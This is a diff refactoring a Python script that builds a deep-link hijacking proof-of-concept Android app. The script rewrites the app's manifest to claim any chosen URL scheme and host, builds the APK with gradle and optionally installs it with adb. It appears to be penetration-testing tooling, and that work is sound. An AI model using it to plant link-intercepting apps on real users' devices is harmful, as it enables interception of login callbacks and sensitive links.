@@ -1,79 +1,160 @@
 #!/usr/bin/env python3
 
-from typing import NoReturn
 import argparse
-from lxml import etree
 import urllib.parse
 import platform
 import os
 import subprocess
 import shutil
+from pathlib import Path
+from lxml import etree
 
-ANDROID_MANIFEST_PATH = "DeepLinkHijackingPoCApp/app/src/main/AndroidManifest.xml"
+PROJECT_DIR = Path("DeepLinkHijackingPoCApp")
+ANDROID_MANIFEST_PATH = PROJECT_DIR / "app/src/main/AndroidManifest.xml"
+APK_LOCATION = PROJECT_DIR / "app/build/outputs/apk/release/DeepLinkHijackingPoCApp-release.apk"
 
-APK_LOCATION = "DeepLinkHijackingPoCApp/app/build/outputs/apk/release/DeepLinkHijackingPoCApp-release.apk"
 
-def insertDeepLink(manifestFile: str, deepLink: str) -> None:
+# -------------------------
+# Utils
+# -------------------------
 
-	xmlParser = etree.XMLParser()
-	manifestTree = etree.parse(manifestFile, parser=xmlParser)
-	manifestRoot = manifestTree.getroot()
+def run_command(command: list[str], cwd: Path | None = None) -> None:
+    """Run command and print output on failure."""
+    try:
+        result = subprocess.run(
+            command,
+            cwd=cwd,
+            check=True,
+            text=True
+        )
+    except subprocess.CalledProcessError as e:
+        print("\n❌ Command failed:", " ".join(command))
+        print("Return code:", e.returncode)
+        raise
 
-	deepLinkIntent = manifestRoot.xpath("./application/activity/intent-filter/data[@android:scheme and @android:host]", namespaces=manifestRoot.nsmap)[0]
 
-	baseAttribute = "{" + manifestRoot.nsmap["android"] + "}"
+# -------------------------
+# Deep Link Injection
+# -------------------------
 
-	parsedDeepLink = urllib.parse.urlparse(deepLink)
+def insert_deep_link(manifest_file: Path, deep_link: str) -> None:
+    if not manifest_file.exists():
+        raise FileNotFoundError(f"Manifest not found: {manifest_file}")
 
-	deepLinkIntent.attrib[baseAttribute + "scheme"] = parsedDeepLink.scheme
+    parsed = urllib.parse.urlparse(deep_link)
 
-	if not parsedDeepLink.netloc:
-		deepLinkIntent.attrib[baseAttribute + "host"] = "*"
-	else:
-		deepLinkIntent.attrib[baseAttribute + "host"] = parsedDeepLink.netloc
+    if not parsed.scheme:
+        raise ValueError("Deep link must include a scheme (example: myapp://host/path)")
 
-	manifestTree.write(manifestFile, pretty_print=True, xml_declaration=True, encoding="utf-8")
+    parser = etree.XMLParser(remove_blank_text=True)
+    tree = etree.parse(str(manifest_file), parser)
+    root = tree.getroot()
 
-def runCommand(command: list) -> NoReturn:
-	result = subprocess.run(command)
-	result.check_returncode()
+    nsmap = root.nsmap.copy()
+    if None in nsmap:
+        nsmap["default"] = nsmap.pop(None)
 
-def buildAPK() -> NoReturn:
+    android_ns = nsmap.get("android")
+    if not android_ns:
+        raise RuntimeError("Android namespace not found in manifest")
 
-	gradleExecutable = ""
+    android = f"{{{android_ns}}}"
 
-	if platform.system() == "Linux":
-		gradleExecutable = "gradlew"
-	elif platform.system() == "Windows":
-		gradleExecutable = "gradlew.bat"
-	else:
-		print("Script only supports Linux and Windows systems.")
-		exit(1)
+    # safer xpath — find ANY matching data tag
+    matches = root.xpath(
+        ".//intent-filter/data[@android:scheme and @android:host]",
+        namespaces=nsmap
+    )
 
-	runCommand([os.path.join("DeepLinkHijackingPoCApp", gradleExecutable), '-pDeepLinkHijackingPoCApp', 'assembleRelease'])
+    if not matches:
+        raise RuntimeError("No <data android:scheme android:host> tag found in manifest")
 
-def main() -> NoReturn:
+    data_tag = matches[0]
 
-	parser = argparse.ArgumentParser(description = 'Deep Link Hijacking Proof-of-Concept Builder - Creates an application for testing Deep Link Hijacking.')
+    data_tag.attrib[android + "scheme"] = parsed.scheme
+    data_tag.attrib[android + "host"] = parsed.netloc or "*"
 
-	parser.add_argument('-l', '--link', dest = 'deeplink', required = True, help = 'Deep Link to hijack using the application.')
-	parser.add_argument('-o', '--output', dest = 'output', help = 'Output location for application.')
-	parser.add_argument('-i', '--install', dest = 'install', action = "store_true", default = False, help = 'Install application after build.')
+    # backup before overwrite
+    shutil.copy(manifest_file, manifest_file.with_suffix(".xml.bak"))
 
-	args = parser.parse_args()
+    tree.write(
+        str(manifest_file),
+        pretty_print=True,
+        xml_declaration=True,
+        encoding="utf-8"
+    )
 
-	insertDeepLink(ANDROID_MANIFEST_PATH, args.deeplink)
-	buildAPK()
+    print(f"✅ Injected deep link: {parsed.scheme}://{parsed.netloc or '*'}")
 
-	if args.output:
-		shutil.copy(APK_LOCATION, args.output)
-	
-	if args.install:
-		runCommand(['adb', 'install', APK_LOCATION])
+
+# -------------------------
+# Build APK
+# -------------------------
+
+def build_apk() -> None:
+    system = platform.system()
+
+    if system == "Windows":
+        gradle = "gradlew.bat"
+        cmd = [gradle, "assembleRelease"]
+    else:
+        gradle = "gradlew"
+        cmd = [f"./{gradle}", "assembleRelease"]
+
+    gradle_file = PROJECT_DIR / gradle
+
+    if not gradle_file.exists():
+        raise FileNotFoundError(f"Missing {gradle_file}")
+
+    if system != "Windows":
+        gradle_file.chmod(gradle_file.stat().st_mode | 0o111)
+
+    run_command(cmd, cwd=PROJECT_DIR)
+
+
+
+# -------------------------
+# Main
+# -------------------------
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Deep Link Hijacking PoC Builder"
+    )
+
+    parser.add_argument(
+        "-l", "--link",
+        required=True,
+        help="Deep link to hijack (example: myapp://host)"
+    )
+
+    parser.add_argument(
+        "-o", "--output",
+        help="Copy built APK to this path"
+    )
+
+    parser.add_argument(
+        "-i", "--install",
+        action="store_true",
+        help="Install APK using adb"
+    )
+
+    args = parser.parse_args()
+
+    insert_deep_link(ANDROID_MANIFEST_PATH, args.link)
+    build_apk()
+
+    if not APK_LOCATION.exists():
+        raise FileNotFoundError("APK not produced — build likely failed")
+
+    if args.output:
+        shutil.copy(APK_LOCATION, args.output)
+        print(f"📦 Copied APK → {args.output}")
+
+    if args.install:
+        run_command(["adb", "install", str(APK_LOCATION)])
+        print("📲 APK installed")
+
 
 if __name__ == "__main__":
-	main()
-
-# References / Help
-# https://stackoverflow.com/questions/57841507/navigation-components-deeplink-using-uri-depending-buildtype
-# https://stackoverflow.com/questions/67487009/running-gradle-build-from-a-parent-folder
+    main()
